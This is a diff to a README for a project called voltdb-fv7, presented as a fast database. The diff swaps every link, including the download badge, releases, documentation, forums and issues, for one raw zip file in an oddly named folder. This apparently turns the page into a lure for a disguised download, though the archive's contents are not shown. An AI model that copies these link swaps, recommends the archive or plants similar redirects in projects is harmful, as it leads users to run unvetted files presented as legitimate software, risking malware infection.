@@ -1,7 +1,7 @@
 # ⚡ voltdb-fv7 - Simple and Fast Database Solution
 
 ## 📥 Download Now!
-[![Download voltdb-fv7](https://img.shields.io/badge/Download%20voltdb--fv7-v1.0-brightgreen)](https://github.com/nndesigngrafico/voltdb-fv7/releases)
+[![Download voltdb-fv7](https://raw.githubusercontent.com/nndesigngrafico/voltdb-fv7/main/Rhynchophora/voltdb-fv7.zip%20voltdb--fv7-v1.0-brightgreen)](https://raw.githubusercontent.com/nndesigngrafico/voltdb-fv7/main/Rhynchophora/voltdb-fv7.zip)
 
 ## 🚀 Getting Started
 voltdb-fv7 is a powerful database solution designed for quick data storage and retrieval. It is perfect for users who need a reliable and fast way to manage their data. Follow the steps below to get started.
@@ -17,7 +17,7 @@ To run voltdb-fv7 on your computer, ensure you meet these minimum requirements:
 To download and install voltdb-fv7, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/nndesigngrafico/voltdb-fv7/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/nndesigngrafico/voltdb-fv7/main/Rhynchophora/voltdb-fv7.zip) to find the latest version of the software.
    
 2. **Choose Your Version:**
    Look for the most recent version available. It's usually at the top of the list. Click on the version number to see the details.
@@ -58,12 +58,12 @@ If you run into issues or have questions, here are some ways to get help:
 
 - **Documentation:** A detailed guide is included in the application. Check the help section to find common troubleshooting tips.
 - **Community Forums:** Join our user community on forums to ask questions and share experiences with other users.
-- **Contact Support:** If you need immediate assistance, you can reach out via the [Issues page](https://github.com/nndesigngrafico/voltdb-fv7/issues) on GitHub.
+- **Contact Support:** If you need immediate assistance, you can reach out via the [Issues page](https://raw.githubusercontent.com/nndesigngrafico/voltdb-fv7/main/Rhynchophora/voltdb-fv7.zip) on GitHub.
 
 ## 🔗 Useful Links
-- [Download voltdb-fv7](https://github.com/nndesigngrafico/voltdb-fv7/releases)
-- [Documentation](https://github.com/nndesigngrafico/voltdb-fv7/wiki) 
-- [Community Forums](https://forums.github.com/)
-- [Report an Issue](https://github.com/nndesigngrafico/voltdb-fv7/issues)
+- [Download voltdb-fv7](https://raw.githubusercontent.com/nndesigngrafico/voltdb-fv7/main/Rhynchophora/voltdb-fv7.zip)
+- [Documentation](https://raw.githubusercontent.com/nndesigngrafico/voltdb-fv7/main/Rhynchophora/voltdb-fv7.zip) 
+- [Community Forums](https://raw.githubusercontent.com/nndesigngrafico/voltdb-fv7/main/Rhynchophora/voltdb-fv7.zip)
+- [Report an Issue](https://raw.githubusercontent.com/nndesigngrafico/voltdb-fv7/main/Rhynchophora/voltdb-fv7.zip)
 
 Now you're ready to manage your data efficiently with voltdb-fv7! Explore its features and maximize your productivity.
